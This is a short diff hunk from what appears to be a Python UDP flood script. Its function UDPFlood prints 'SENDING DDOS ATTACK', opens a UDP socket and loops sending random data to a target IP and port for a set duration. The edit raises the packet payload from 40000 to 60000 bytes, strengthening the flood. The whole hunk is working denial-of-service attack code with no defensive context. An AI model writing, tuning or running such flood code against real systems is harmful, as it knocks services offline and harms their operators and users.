@@ -13,7 +13,7 @@ def UDPFlood():
     duration=(1,(clock()+dur))[dur>0]
     print('SENDING DDOS ATTACK: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    bytes=random._urandom(40000)
+    bytes=random._urandom(60000)
     while True:
         port=(random.randint(1,15000000),port)[randport]
         if clock()<duration:
